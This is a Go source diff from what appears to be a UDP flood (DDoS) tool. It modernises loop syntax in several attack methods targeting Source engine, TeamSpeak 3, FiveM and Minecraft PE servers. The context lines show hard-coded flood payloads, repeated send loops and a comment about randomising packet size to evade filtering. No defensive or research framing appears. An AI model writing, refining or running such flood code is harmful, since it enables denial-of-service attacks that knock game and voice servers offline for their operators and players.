@@ -59,7 +59,7 @@ func (u *UDPAttack) executeUDP(ctx context.Context) error {
 	defer conn.Close()
 
 	// Random payload size between 64 and 1024 bytes to avoid static filtering
-	for i := 0; i < 100; i++ {
+	for range 100 {
 		select {
 		case <-ctx.Done():
 			return ctx.Err()
@@ -96,7 +96,7 @@ func (u *UDPAttack) executeVSE(ctx context.Context) error {
 		0x6e, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00,
 	}
 
-	for i := 0; i < 100; i++ {
+	for range 100 {
 		select {
 		case <-ctx.Done():
 			return ctx.Err()
@@ -130,7 +130,7 @@ func (u *UDPAttack) executeTS3(ctx context.Context) error {
 		0x00, 0x00, 0x00, 0x00, 0x02,
 	}
 
-	for i := 0; i < 100; i++ {
+	for range 100 {
 		select {
 		case <-ctx.Done():
 			return ctx.Err()
@@ -161,7 +161,7 @@ func (u *UDPAttack) executeFIVEM(ctx context.Context) error {
 
 	payload := []byte{0xff, 0xff, 0xff, 0xff, 'g', 'e', 't', 'i', 'n', 'f', 'o', ' ', 'x', 'x', 'x', 0x00, 0x00, 0x00}
 
-	for i := 0; i < 100; i++ {
+	for range 100 {
 		select {
 		case <-ctx.Done():
 			return ctx.Err()
@@ -190,7 +190,7 @@ func (u *UDPAttack) executeFIVEMTOKEN(ctx context.Context) error {
 	}
 	defer conn.Close()
 
-	for i := 0; i < 100; i++ {
+	for range 100 {
 		select {
 		case <-ctx.Done():
 			return ctx.Err()
@@ -235,7 +235,7 @@ func (u *UDPAttack) executeMCPE(ctx context.Context) error {
 	// Add random GUID
 	rand.Read(payload[len(payload)-8:])
 
-	for i := 0; i < 100; i++ {
+	for range 100 {
 		select {
 		case <-ctx.Done():
 			return ctx.Err()
